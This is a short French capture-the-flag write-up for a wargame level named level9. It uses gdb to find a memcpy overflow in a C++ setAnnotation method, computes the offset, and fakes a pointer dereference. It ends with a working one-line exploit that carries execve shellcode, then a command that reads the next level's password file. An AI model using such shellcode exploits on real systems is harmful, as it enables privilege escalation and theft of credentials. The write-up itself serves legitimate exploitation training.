gdb level9

info function

on apercoit des nouvelles fonctions et des call en CPP 

N::N(int)
N::setAnnotation(char*)
N::operator+(N&)
N::operator-(N&)

ligne 131 dans le gdb on apercoit un setteur "setAnnotation"

ce meme setteur fait un memcpy on va essayer de faire un overflow avec 

run'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

on va regarder ou ca segfault grace a : info register eax

on met le eax : 0x41366441
dans le buffer overflow helper et il nous informe que le offset se situe a 108

on va mettre un breakpoint au moment ou l'annotation est appele pour recuperer l'adresse juste avant le segfault

b *main+136 

run 'AAAA'
x $eax

0x804a00c cest l'adresse du buffer

ce qu'on va faire c'est qu'on va aller a esp+0x10 en faisant 0x804a00c + 4 = 0x0804a010

pourquoi ? 

Le programme lit une adresse à [esp+0x10], puis la suit deux fois

On fait un deferencement (une fausse structure à [esp+0x10] qui, en mémoire, contient l’offset 0 : un pointeur vers le début du shellcode)

on va remplacer la valeur par l'overflow qu'on veut faire donc 108, en mettant l'adresse, le code, le padding et l'adresse du buffer ca nous donne 108 + 4

./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + 83 * "A" + "\x0c\xa0\x04\x08"')

cat /home/user/bonus0/.pass